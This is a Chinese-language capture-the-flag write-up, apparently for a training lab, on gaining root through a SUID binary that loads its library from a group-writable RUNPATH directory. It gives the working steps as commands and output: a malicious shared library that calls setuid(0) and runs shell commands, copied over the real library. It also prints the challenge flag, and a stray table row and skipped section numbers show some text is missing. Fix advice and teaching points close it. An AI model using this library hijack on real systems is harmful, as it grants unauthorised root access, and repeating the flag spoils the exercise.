## 二、题目考点

1. **动态链接器的搜索顺序**：`DT_RPATH/RUNPATH` 位于系统默认路径之前；`RUNPATH` 里的库优先级高于 `/lib/x86_64-linux-gnu`。
2. **SUID 的 secure-execution 模式**：它会丢弃 `LD_PRELOAD`、`LD_LIBRARY_PATH` 等环境变量，但**不会**丢弃编译进二进制的 `RPATH/RUNPATH` —— 这是本题的核心对比点。
3. **`-Wl,-rpath` 的工程含义**：把库目录写死进二进制，等于把“加载哪个库”的决定权交给该目录的写权限持有者。
4. **SGID 目录（2775）**：组可写 + 新建文件继承组，所以组内成员既能改写既有库，也能投放同名新库。
5. **为什么 `ldd` 输出可信**：`ldd` 显示的 `libbackup.so => /opt/backup/lib/...` 直接暴露了加载来源。
6. **修复口径**：SUID 程序不要引用可写目录里的库；库目录 `chmod 755 root:root`；能用服务化就别用 SUID。

## 三、解题过程

### 3.1 第一步：找到 SUID 入口并跑一次

```bash
find / -perm -4000 -type f 2>/dev/null | grep backup
# /opt/backup/bin/backup-tool

/opt/backup/bin/backup-tool
# [backup-tool] starting backup as uid=1001 euid=0
# [libbackup] performing nightly backup
# [backup-tool] result: 0
```

`euid=0` 说明它确实是 SUID root。

### 3.2 第二步：确认库从哪里加载

```bash
readelf -d /opt/backup/bin/backup-tool | grep -Ei 'rpath|runpath'
# (RUNPATH)  Library runpath: [/opt/backup/lib]

ldd /opt/backup/bin/backup-tool
# libbackup.so => /opt/backup/lib/libbackup.so
```

### 3.3 第三步：确认这个目录我能写

```bash
id
# groups=1001(player),996(ops)

ls -ld /opt/backup/lib; ls -l /opt/backup/lib/libbackup.so
# drwxrwsr-x 1 root ops   /opt/backup/lib        <-- 我在 ops 组
# -rw-rw-r-- 1 root ops   libbackup.so           <-- 组可写
```

### 3.4 第四步：先验证环境变量注入是无效的

```bash
cat > /tmp/evil.c <<'EOF'
#include <stdlib.h>
#include <unistd.h>
int backup_run(void){ setuid(0); setgid(0); system("id; cat /flag.txt"); return 0; }
EOF
gcc -shared -fPIC -o /tmp/libbackup.so /tmp/evil.c

LD_PRELOAD=/tmp/libbackup.so /opt/backup/bin/backup-tool
# [libbackup] performing nightly backup      <-- 预加载被忽略

LD_LIBRARY_PATH=/tmp /opt/backup/bin/backup-tool
# [libbackup] performing nightly backup      <-- 环境变量路径也被忽略
```

SUID 程序进入 secure-execution 模式，`LD_*` 全部作废 —— 但 RUNPATH 依然生效。

### 3.5 第五步：替换 RUNPATH 里的库

```bash
cp /tmp/libbackup.so /opt/backup/lib/libbackup.so
/opt/backup/bin/backup-tool
# uid=0(root) gid=0(root) groups=0(root),996(ops),1001(player)
# Ly_Flag{ldtu2xb7}
# [backup-tool] starting backup as uid=1001 euid=0
```

`backup_run()` 现在是我们编译的恶意实现，`setuid(0)` 之后读走 flag。

| 思路 | 实测结果 |

### 4.2 flag 每题固定（flag.txt）
flag 是**每题一个固定值**：题目目录下的 `flag.txt` 由 Dockerfile `COPY` 到 `/flag.txt`，
再 `chown root:root && chmod 400`。十道题十份文件、内容互不相同；同一题多次构建、多个实例
取值都一致，评分不需要再按实例取 flag。

```bash
docker exec lx10 stat -c '%a %U:%G' /flag.txt   # 400 root:root
docker exec lx10 cat /flag.txt                    # Ly_Flag{ldtu2xb7}
```

注意：flag 在构建时就写进镜像层，`docker save` 出来的 tar 同样带着它；若镜像/tar 会发给选手，
等于直接送出 flag，这种情况下应改为运行时挂载或环境变量注入。

## 六、修复建议

1. **库目录收到 root 独占**：`chown -R root:root /opt/backup/lib && chmod -R 755`，去掉 SGID 与组写位。
2. **不要用 `-rpath` 指向可写目录**：安装到标准前缀（`/usr/local/lib`）并走 `ldconfig`，或用绝对只读路径。
3. **能用服务就不用 SUID**：把备份做成 systemd 服务 + 受限入口脚本，避免“任意用户可触发 root 代码”。
4. **校验库完整性**：SUID 程序启动时校验 `libbackup.so` 的哈希/签名；配合 AIDE 监控 `/opt/backup` 变更。
5. **基线检查**：`awk '/RUNPATH|RPATH/'` 扫所有 SUID 二进制的动态节，命中可写目录即告警。

---

## 七、教学要点

1. 加载顺序记牢：`RPATH/RUNPATH` → `LD_LIBRARY_PATH`（SUID 下失效）→ `ld.so.cache` → 默认目录。
2. `LD_PRELOAD` 与 `LD_LIBRARY_PATH` 在 SUID 下失效，但 `RUNPATH` 不会 —— 这正是本题与“普通环境变量注入”的分水岭。
3. 判断一个 SUID 程序是否可劫持，只需两问：库从哪加载（`readelf -d`）？那个目录我能写吗（`ls -ld`）？
4. 库目录带 SGID 只是“顺手”细节，真正致命的是**可写**；看到 `2775` 就应该立刻想到组内可投放同名库。
5. 修复优先级：先去写权限，再考虑去掉 SUID，最后才是完整性校验。
